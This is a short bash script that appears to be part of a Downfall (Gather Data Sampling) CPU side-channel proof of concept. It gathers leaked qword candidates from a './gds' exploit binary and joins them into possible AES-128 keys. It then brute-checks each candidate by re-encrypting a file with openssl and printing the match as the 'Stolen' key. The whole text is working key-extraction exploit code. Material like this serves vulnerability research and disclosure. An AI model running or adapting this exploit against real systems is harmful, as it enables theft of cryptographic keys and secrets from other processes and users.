#Grab information from gds register and get first qword
i=3
arrA=()
for line in $(timeout -s2 5s taskset -c 5 ./gds 0); do
    if [ $(expr $i % 4) == 0 ]; then
        echo $line
        arrA[${#arrA[@]}]=$line
    fi
    i=$((i + 1))
done
echo "1st QWORD Candidates: ${#arrA[@]}"
#Grab information from gds register and get second qword
i=3
arrB=()
for line in $(timeout -s2 5s taskset -c 5 ./gds 1); do
    if [ $(expr $i % 4) == 0 ]; then
        echo $line
        arrB[${#arrB[@]}]=$line
    fi
    i=$((i + 1))
done
echo "2nd QWORD Candidates: ${#arrB[@]}"
# Do all combinations and store in c
arrC=()
for line1 in "${arrA[@]}"; do
    for line2 in "${arrB[@]}"; do
        arrC[${#arrC[@]}]=$line1$line2
    done
done
# Check if when encrypting it matches the encrypted value
echo "Total candidates: ${#arrA[@]} x ${#arrB[@]} = ${#arrC[@]}"
i=1
for line1 in "${arrC[@]}"; do
    echo $i $line1
    stolen=$(echo $line1 | tr '[:lower:]' '[:upper:]')
    openssl aes-128-cbc -salt -e -in /tmp/downfall.txt -out /tmp/downfall.txt.encrypted2 -K $stolen -iv 11111111111111111111111111111111
    found=`diff /tmp/downfall.txt.encrypted /tmp/downfall.txt.encrypted2 | wc -l`
    if [ "$found" = "0" ]; then
        echo "Stolen: $stolen"
        exit
    fi
    i=$((i + 1))
done
